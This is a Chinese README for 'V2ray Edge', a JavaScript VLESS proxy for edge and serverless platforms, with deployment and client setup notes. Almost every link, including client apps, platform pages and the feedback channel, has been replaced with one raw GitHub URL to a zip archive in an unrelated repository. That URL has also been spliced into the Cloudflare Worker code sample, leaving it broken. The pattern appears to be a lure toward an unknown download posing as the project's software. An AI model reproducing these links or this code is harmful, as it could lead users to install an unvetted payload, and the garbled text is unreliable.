# V2ray Edge（Beta）

> 由于 deno deploy 的限制，免费用户目前无法部署。

> Due to restrictions of deno deploy, free users can't deploy currently. Please check the Telegram group for more information.
> https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

众所周知，V2ray 是基于 `go` 的，导致原版 V2ray 无法部署到基于 `javaScript (V8)` 的平台上。

本项目通过，使用 `js` 实现 `VLESS`协议， 使得 **V2ray** 可以部署到一些 Edge 或者 Serverless 平台上。

> For international user, I write this readme in Chinese. But I understand English pretty well, if you has any issue, please open it in Github.

> 本项目纯属技术性验证，探索最新的 web standard。请勿乱用，不给予任何保证。

## ~~V2ray Edge server --- Deno deploy~~

> 由于 deno deploy 的限制，免费用户目前无法部署。
> https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

Edge tunnel 的服务使用了 [Deno deploy](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip).

### 风险提示

`Deno deploy` 采用 [fair use policy](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip), 翻译成中文就是`看良心使用`。 违反可能会封号。
按照我的理解，本项目应该是违反 fair use policy。请大家**酌情使用**。

### 如何部署服务

~~请查看下面教程。~~

~~[Deno deploy Install](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)~~

## V2ray Edge server --- Cloudflare Worker （敬请期待）

这个需要等 Cloudflare 发布下面的技术。
https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

> Cloudflare 大气的免费政策，外加 优选 IP。使得 部署 V2ray 变得无比简单。

> 这个不是利用 Worker 进行反代， 而是直接部署 V2ray （js 版本）到 Worker 上。

## V2ray Edge server --- https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

很多 https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip 的平台都是支持 docker 的，所以可以直接部署原版。但是既然很多人要，我就写一个。我目前仅仅维护 render 平台的文档。理论上其他平台都一样。

### https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

[render](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)

### Docker

``` bash
docker run -d -p 4600:4100 -e UUID=ce6d9073-7085-4cb1-a64d-382489a2af94 zizifn/node-vless:latest
```
> 如果你想让 DNS IPV4 优先， 请设置环境变量DNSORDER=ipv4first


## 客户端 v2rayN 配置

> ⚠️ 由于 edge 平台限制，无法转发 UDP 包。请在配置时候，把 DNS 的策略改成 "Asis", 否则会影响速度。
> 请不要开启 ipv6 优先。

> [ DNS 科普文章](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip%E6%BC%AB%E8%B0%88%E5%90%84%E7%A7%8D%E9%BB%91%E7%A7%91%E6%8A%80%E5%BC%8F-dns-%E6%8A%80%E6%9C%AF%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8-62c50e58cbd0)

### Windows 版本

https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip
别人的配置教程参考，https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

具体配置，请参考部署服务的主页。

### 安卓

[v2rayNG](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)

[SagerNet](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)

如果遇到安卓无法使用, 请参考如下配置，多尝试下 DNS 设置。

v2rayNG 设置。
![andriod-v2ray](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)

### IOS

> 需要美国区账户

[shadowrocket](https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip)

## 建立 cloudflare worker 反代 （可选）

```js
const targetHost = 'https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip'; //你的 edge function 的hostname
addEventListener('fetch', (event) => {
  let url = new URL(https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip);
  https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip = targetHost;
  let request = new Request(url, https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip);
  https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip(fetch(request));
});
```

优选 IP https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip

# FAQ

## 那些平台可以使用？

判断一个平台是否可以支持的，有 2 个必要条件，

1. 是否支持 websocket？
   - 或者支持，HTTP request stream 也是可以的。https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip
2. 可以创建 raw tcp socket？

> Cloudflare Worker 虽然支持 websocket，但是 Worker 的 runtime 没有支持 创建 raw tcp socket 的 API。

## 不支持 UDP

由于 edge 平台限制，无法转发 UDP 包。所以 DNS 策略请设置成 `Asis`.

## 不支持 VMESS

VMESS 协议过于复杂，并且所有 edge 平台都支持 HTTPS， 所以无需 VMESS.

# 反馈与交流

如果有问题，请使用 https://raw.githubusercontent.com/mcseali/test-deno/main/tools/generators/test_deno_2.2-beta.3.zip 进行交流。
